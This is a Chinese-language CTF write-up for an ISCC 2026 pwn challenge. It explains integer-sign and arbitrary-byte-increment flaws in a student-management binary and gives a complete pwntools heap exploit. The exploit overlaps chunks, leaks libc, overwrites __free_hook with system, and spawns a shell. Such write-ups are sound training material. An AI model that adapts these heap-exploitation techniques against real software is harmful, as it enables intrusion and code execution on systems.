+++
title = "test"
date = "2026-05-06"
type = "post"
categories = ["ISCC2026"]
tags = ["ISCC2026"]
draft = false
+++
# ISCC 2026 pwn WP
## 1. 基本信息
```bash
file attachment-35
# ELF 64-bit PIE
checksec:
# Arch: amd64
# RELRO: Full RELRO
# Canary: enabled
# NX: enabled
# PIE: enabled
libc: glibc 2.31
```

保护全开，不能改 GOT，主要走堆利用。
## 2. 结构体还原

程序维护一个全局学生数组：

```c
student *list[7];
int cnt;
int role; // 0 teacher, 1 student
```

外层结构：

```c
struct student {
    struct info *info;   // +0x00
    void *mode;          // +0x10
    int is_lazy;         // +0x18
    int used_reward;     // +0x1c
};
```

内层结构：

```c
struct info {
    int question_num;    // +0x00
    int score;           // +0x04
    char *review;        // +0x08
    int review_size;     // +0x10
};
```

`add student`：

```c
student = calloc(1, 0x20);
info = calloc(1, 0x18);
student->info = info;
```

---

## 3. 关键漏洞

### 漏洞 1：奖励逻辑给任意地址单字节 +1

`check review` 里：

```c
if (score > 89 && !used_reward) {
    printf("Good Job! Here is your reward! %p", student);
    read addr;
    *(char *)addr += 1;
    used_reward = 1;
}
```

也就是：

```c
任意地址 1 byte += 1
```

同时它会泄露当前 student 的堆地址。

---

### 漏洞 2：score 可以变成负数，绕过 `score > 89`

正常分数最大是 89，看似不能触发 reward。

但 `give score` 中：

```c
score = rand_byte % (question_num * 10);

if (student->is_lazy == 1) {
    score -= 10;
}
```

如果先把 `is_lazy` 设为 1，分数会变成 `-10 ~ -1`。

后面判断使用的是无符号比较：

```asm
cmp eax, 0x59
jbe no_reward
```

负数在 unsigned 下非常大，因此可以触发 reward。

利用流程：

```text
add student
change role -> student
set mode / lazy
change role -> teacher
give score
check review
```

---

### 漏洞 3：通过单字节 +1 扩大 chunk size，制造堆重叠

评论大小最大 `0x3ff`。

申请 `0x3e0` 的 review：

```c
review = calloc(1, 0x3e0);
```

实际 chunk size 是：

```text
0x3f0
```

size 字段：

```text
0x3f1
```

如果用 reward 把 size 字段第二个字节加一：

```text
0x03 -> 0x04
```

chunk size 就从：

```text
0x3f0 -> 0x4f0
```

之后 free 这个 review，就能得到一个伪造的大 unsorted chunk，覆盖后面 student 的结构体。

---

## 4. 利用思路

整体流程：

```text
1. add student 0
2. 给 student 0 写 review，size = 0x3e0
3. add student 1，使 student 1 紧跟在 review0 后面
4. 让 student 0 分数为负数，触发 reward
5. 用 reward 把 review0 chunk size 从 0x3f0 改成 0x4f0
6. delete student 0，释放伪造大 chunk，进入 unsorted bin
7. add student 2，并申请 0x3ff 的 review
8. 该 review 会从 unsorted chunk 切出来，覆盖 student 1 的结构体
9. 伪造 student 1 的 info，实现任意读 / 任意写
10. 泄露 libc
11. 写 __free_hook = system
12. free("/bin/sh")
```

---

## 5. libc 泄露

伪造大 chunk 被重新分配后，剩余部分仍在 unsorted bin。

unsorted bin 的 fd / bk 指向：

```text
main_arena + 0x60
```

glibc 2.31 中常用：

```python
libc_base = leak - 0x1ecbe0
```

---

## 6. getshell 脚本

39.96.193.120:10016

```python
from pwn import *

context.arch = "amd64"

elf = ELF("./attachment-35")
libc = ELF("./attachment-35.so")

p = process(
    ["./attachment-35"],
    env={"LD_PRELOAD": "./attachment-35.so"}
)

def sla(x, y):
    p.sendlineafter(x, y)

def sa(x, y):
    p.sendafter(x, y)

def menu(x):
    sla(b"choice>>", str(x).encode())

def add(q=1):
    menu(1)
    sla(b"enter the number of questions:", str(q).encode())

def test():
    menu(2)

def review(idx, size=None, data=b""):
    menu(3)
    sla(b"which one? >", str(idx).encode())
    if size is not None:
        sla(b"please input the size of comment:", str(size).encode())
    sa(b"enter your comment:", data)

def delete(idx):
    menu(4)
    sla(b"which student id to choose?", str(idx).encode())

def change_role(r):
    menu(5)
    sla(b"role: <0.teacher/1.student>:", str(r).encode())

def student_menu(x):
    menu(x)

def change_id(idx):
    student_menu(6)
    sla(b"which student id to choose?", str(idx).encode())

def set_lazy():
    student_menu(4)

def check_review():
    student_menu(2)

def make_negative_score(idx):
    change_role(1)
    change_id(idx)
    set_lazy()
    change_role(0)
    test()

# -------------------------
# 1. 初始化堆布局
# -------------------------

sla(b"role: <0.teacher/1.student>:", b"0")

add(1)                  # student 0
review(0, 0x3e0, b"A")  # review0, chunk size 0x3f0

add(1)                  # student 1，位于 review0 后方

# -------------------------
# 2. 触发 reward，泄露 heap
# -------------------------

make_negative_score(0)

change_role(1)
change_id(0)
check_review()

p.recvuntil(b"reward! ")
heap_leak = int(p.recvline().strip(), 16)
log.success(f"student0 = {hex(heap_leak)}")

# review0 data = student0 + 0x50
review0 = heap_leak + 0x50

# review0 chunk size 地址 = review0 - 8
# size = 0x3f1，第二字节在 review0 - 7
size_byte = review0 - 7

sla(b"addr:", str(size_byte).encode())

# -------------------------
# 3. free fake large chunk
# -------------------------

change_role(0)
delete(0)

# -------------------------
# 4. 重新申请，覆盖 student1
# -------------------------

add(1)   # student2，消耗 tcache 中的 student0 / info0

# 当前 student2 的 review 会从 fake unsorted chunk 分配
# review2 起点仍然是 review0
#
# student1 外层结构位于 review0 + 0x3f0
# 在 payload 中覆盖 student1:
#
# student1->info = fake_info
# fake_info->score = -1
# fake_info->review = unsorted remainder bk
# fake_info->review_size = 8

fake_info = review0 + 0x100
student1_off = 0x3f0

unsorted_leak_addr = review0 + 0x410 + 0x10

payload = b""
payload = payload.ljust(0x100, b"\x00")

payload += p32(1)                # question_num
payload += p32(0xffffffff)       # score = -1
payload += p64(unsorted_leak_addr)
payload += p32(8)

payload = payload.ljust(student1_off, b"\x00")
payload += p64(fake_info)        # student1->info
payload += p64(0)
payload += p64(0)
payload += p32(0)
payload += p32(0)

review(2, 0x3ff, payload)

# -------------------------
# 5. 泄露 libc
# -------------------------

change_role(1)
change_id(1)
check_review()

p.recvuntil(b"here is the review:\n")
leak = u64(p.recv(8))
libc_base = leak - 0x1ecbe0

log.success(f"libc leak = {hex(leak)}")
log.success(f"libc base = {hex(libc_base)}")

system = libc_base + libc.sym["system"]
free_hook = libc_base + libc.sym["__free_hook"]

log.success(f"system = {hex(system)}")
log.success(f"__free_hook = {hex(free_hook)}")

# -------------------------
# 6. 任意写 __free_hook = system
# -------------------------

payload = b""
payload = payload.ljust(0x100, b"\x00")

payload += p32(1)
payload += p32(0xffffffff)
payload += p64(free_hook)
payload += p32(8)

payload = payload.ljust(student1_off, b"\x00")
payload += p64(fake_info)

change_role(0)
review(2, None, payload)

change_role(1)
change_id(1)
student_menu(3)        # pray / write through fake review ptr
p.send(p64(system))

# -------------------------
# 7. free("/bin/sh")
# -------------------------

change_role(0)

add(1)
review(3, 0x20, b"/bin/sh\x00")

delete(3)

p.interactive()
```
## 附件下载

- [attachment-35](attachment-35)
- [attachment-35.so](attachment-35.so)

